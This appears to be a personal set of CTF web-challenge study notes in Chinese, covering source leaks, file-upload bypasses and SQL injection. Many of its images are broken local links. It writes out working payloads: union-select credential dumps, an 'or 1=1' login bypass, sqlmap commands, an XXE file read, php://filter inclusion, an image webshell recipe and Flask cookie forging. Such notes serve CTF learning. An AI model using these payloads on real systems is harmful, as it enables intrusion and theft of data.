# **CTF-WEB**

[TOC]



[TOC]

![image-20230626211805441](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230626211805441.png)

## *信息泄露-备份文件

常见的网络源码备份文件后缀

tar,tar.gz,zip,rar

常见的网站源码备份文件名

web,website,backup,back,www,wwwroot,temp

​	Bak文件

​		bak文件：访问url/index.php.bak 下载index源码，打开获得flag

​	Vim缓存

​		![image-20230621102359311](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230621102359311.png)

### DS_Store

![image-20230621205636515](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230621205636515.png)

## Git泄露

### 先用dirsearch扫描，1，git log看日志

​	![image-20230621111935657](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230621111935657.png)

## stash

![image-20230621145542447](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230621145542447.png)

## svn泄漏

![image-20230621165350531](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230621165350531.png)

1,cd -ah进入隐藏目录

2，cd p........进入p开头的一个文件

3,一个个进入他的子文件

## Hg泄露

![image-20230621204506251](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230621204506251.png)

先用dirsearch扫描

![image-20230621204831623](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230621204831623.png)

## *文件上传漏洞

### js前端绕过

法1

![image-20230622145807069](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622145807069.png)

法2

![image-20230622145825280](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622145825280.png)

法3

![image-20230622145835516](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622145835516.png)

## 服务端校验

### 1.Content-type绕过

![image-20230622150602849](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622150602849.png)

### 2.文件名绕过

![image-20230622150651532](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622150651532.png)

### 3. 。htaccess

![image-20230622150803801](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622150803801.png)

这个已经过滤了很多后缀，绕不过去了

![image-20230622150849822](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622150849822.png)

### 4.文件后缀名大小写混合过滤

![image-20230622151110556](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622151110556.png)

![image-20230622151320284](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622151320284.png)

“1.php”变为“1.php ”

### 5.在php后面加.

### 6.

![image-20230622151556961](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622151556961.png)

### 7 and 8

![image-20230622151709517](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622151709517.png)

### 文件头检查

![image-20230622152153957](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622152153957.png)

![image-20230622152303446](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622152303446.png)

![image-20230622153328586](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622153328586.png)

关关难过关关过

![image-20230622153430272](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622153430272.png)

文件上传漏洞-------条件竞争

![image-20230622154024765](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622154024765.png)

# SQL注入

![image-20230622165743016](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622165743016.png)

![image-20230622165840616](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622165840616.png)

![image-20230622165902384](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622165902384.png)

![image-20230622171239081](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622171239081.png)

![image-20230622171311424](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622171311424.png)

### 整形注入

例

![image-20230622200125334](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622200125334.png)

![image-20230622200144096](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622200144096.png)

### 字符型注入

![image-20230622200457437](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622200457437.png)

![image-20230622201026024](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622201026024.png)

### 盲注

![image-20230622201434556](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622201434556.png)

布尔型

![image-20230622201731678](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622201731678.png)

实时间盲注

![image-20230622202513707](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622202513707.png)

### cookie注入

![image-20230622213405522](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622213405522.png)

![image-20230622214124741](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622214124741.png)

![image-20230622214143538](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622214143538.png)

![image-20230622214055848](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230622214055848.png

## 远程控制

![image-20230623092828758](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230623092828758.png)

![image-20230623092916386](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230623092916386.png)

![image-20230623093236258](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230623093236258.png)![image-20230623093255387](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230623093255387.png)

![image-20230623093349159](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230623093349159.png)

### 文件包含

![image-20230623093625307](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230623093625307.png)

![image-20230623094005382](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230623094005382.png)

### 文件包含代码

**?file=php://filter/read=convert.base64-encode/resource=flag.php**

#### 文件包含//nginx;;;;;;;见csdn

# 做题

![image-20230623153031455](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230623153031455.png)

flag或空格等等等被过滤

![image-20230623155244018](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230623155244018.png)

![](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230623155313619.png)

sql-------flag被注入

### ![image-20230623172209377](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\image-20230623172209377.png)伪php协议

**php://filter/read=convert.base64-encode/resource=hint.php****

//由sqlmap得到数据库，表明，列名。。。。最后得到flag，适用于sql注入；

```
sqlmap -u http://node1.anna.nssctf.cn:28894/?id=1 --dbs //得到库名
sqlmap -u http://node1.anna.nssctf.cn:28894/?id=1 -D test_db --tables //得到表命
sqlmap -u http://node1.anna.nssctf.cn:28894/?id=1 -D test_db -T test_tb --columns //得到列名
sqlmap -u http://node1.anna.nssctf.cn:28894/?id=1 -D test_db -T test_tb -C flag --dump //输出FLAG
```

### **//取反过滤**

## 知识点

取反过滤：取反过滤是先将命令取反，然后对其进行[url编码](https://so.csdn.net/so/search?q=url编码&spm=1001.2101.3001.7020)最后在上传时再一次进行取反。

取反过滤可以绕过[preg_match](https://so.csdn.net/so/search?q=preg_match&spm=1001.2101.3001.7020)()过滤的所有字符和数字。

### 取反脚本

<?php
echo urlencode(~'取反内容');
?> 

获取取反结果后在url注入栏输入

(~取反结果1)(~取反结果2);

## sql注入

万能密码

账号:admin' or 1=1#

密码:1

输入框的#，直接使用hackbar地址栏，需将#进行URL编码，即替换为%23

1,爆字段

check.php?username=admin ' order by 1 %23&password=1
check.php?username=admin ' order by 2 %23&password=1
check.php?username=admin ' order by 3 %23&password=1

看有几个字段，

看回显

1' union select 1,2,3 #

爆数据库

1' union select 1,database(),version() #

爆数据库的表

只有一个数据库

1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #

有多个数据库，选择一个数据库

1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='DATABASE'

### 爆出表的列

1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='AAA' #

爆内容

username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1

## xxe漏洞

<!DOCTYPE root[

<!ENTITY admin SYSTEM "file:///flag">

### ]>

<root>

<username>&admin;</username>

<password>2333</password>

</root>

怎么说呢，xxe就是DTD中可以执行外部的文件

## xss漏洞

#### 文件上传漏洞测试流程

1、上传文件，查看返回结果（路径，提示等）
2、尝试上传不同类型的“恶意”文件，比如xx.php文件，分析结果
3、查看html源码，看是否通过js在前端做了上传限制，想办法绕过
4、尝试使用不同方式进行绕过：黑白名单绕过/MIME类型绕过/目录0x00截断绕过等
5、猜测或者结合其他漏洞（比如敏感信息泄露等）得到木马路径，连接测试

函数

## creat_function($a,$b)

a是函数变量部分，b是函数方法代码部分。

这个函数内部有一个eval()函数，可执行b.

disallow:---->暗示robots.txt

### 异或注入

   ^       运算符会做位异或运算 如1^2=3 1^2=3

xor   做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据

### Flask,s使用办法

![1696776151814](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1696776151814.png)

加密

$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
{'logged_in': False}

解密

$ flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
eyJsb2dnZWRfaW4iOnRydWV9.XDuW-g.cPCkFmmeB7qNIcN-ReiN72r0hvU

### SSTI

！！！！！！！ssti会执行{{...}}...的语句！！！！！！

变量名可能是name,详情见csdn

### session文件包含

·session文件包含，一般利用GET传参将我们构造好的恶意代码传入session中的，但没有 GET 传参还能往 session 中写入代码吗？当然可以，php 5.4后添加了 session.upload_progress 功能，这个功能开启意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中，利用这个特性可以将恶意语句写入session文件。
··session.auto_start：如果 session.auto_start=On ，则PHP在接收请求的时候会自动初始化 Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为 off。此时用户是可以自己定义 Session ID 的。比如，我们在 Cookie 里设置 PHPSESSID=ph0ebus ，PHP 将会在服务器上创建一个文件：/tmp/sess_ph0ebus”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的 session.upload_progress.name 值组成，最后被写入 sess_ 文件里。
·session.save_path：负责 session 文件的存放位置，后面文件包含的时候需要知道恶意文件的位置，如果没有配置则不会生成session文件
·session.upload_progress_enabled：当这个配置为 On 时，代表 session.upload_progress 功能开始，如果这个选项关闭，则这个方法用不了
·session.upload_progress_cleanup：这个选项默认也是 On，也就是说当文件上传结束时，session 文件中有关上传进度的信息立马就会被删除掉；这里就给我们的操作造成了很大的困难，我们就只能使用条件竞争(Race Condition)的方式不停的发包，争取在它被删除掉之前就成功利用
·session.upload_progress_name：当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控
·session.upload_progress_prefix：它＋session.upload_progress_name 将表示为 session 中的键名

### 图片马

通过 copy/b 1.jpg/b+1yh.php muma.png  生成带有一句话木马的图片

#### XXF

如果说要从local，一般可以想到X-F-F：127.0.0.1，

如果这样还不行的话加上Referer: 127.0.0.1

x-client-ip

X-Real-Ip

##### session_key伪造

python D:\ctf_tools\flask-session-cookie-manager-master\flask-session-cookie-manager-master\flask_session_cookie_manager3.py encode -s 'Geek' -t "{'alg':'VanZY','typ':'admin'}"

有脚本。

###### 死亡绕过

[file_put_content和死亡·杂糅代码之缘 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8163#toc-2)

[谈一谈php://filter的妙用 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

###### 虚拟表---withrollups

with rollup 可以对 group by 分组结果再次进行分组,并在最后添加一行数据用于展示结果( 对group by未指定的字段进行求和汇总, 而group by指定的分组字段则用null占位)

我们使用万能用户名 a'/**/or/**/true/**/# 使SQL成立绕过用户名之后, 后台的SQL会查询出所有的用户信息, 然后依次判断查询处的用户名对应的密码和我们输入的密码是否相同, 这时候我们使用with rollup 对 group by 分组的结果再次进行求和统计, 由于with rollup 不会对group by 分组的字段( password)进行统计, 所以会在返回结果的最后一行用null来填充password, 这样一来我们的返回结果中就有了一个值为null的password , 只要我们登录的时候password输入框什么都不输, 那我么输入的password的值就是null, 跟查询出的用户密码相同( null == null), 从而登录成功
———————————————